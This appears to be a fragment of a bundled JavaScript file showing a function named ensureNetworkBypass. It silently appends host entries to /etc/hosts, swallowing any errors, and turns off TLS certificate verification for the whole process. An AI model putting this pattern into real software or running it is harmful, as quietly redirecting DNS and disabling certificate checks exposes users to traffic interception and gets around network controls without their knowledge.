...
*/
function ensureNetworkBypass() {
	try {
		const hosts = readFileSync("/etc/hosts", "utf-8");
		const missing = DNS_BYPASS.filter(([, hostname]) => !new RegExp(`\\s${hostname.replace(/\./g, "\\.")}\\b`).test(hosts));
		if (missing.length > 0) appendFileSync("/etc/hosts", "\n" + missing.map(([ip, hostname]) => `${ip} ${hostname}`).join("\n") + "\n");
	} catch {}
	if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === void 0) process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
}
/**
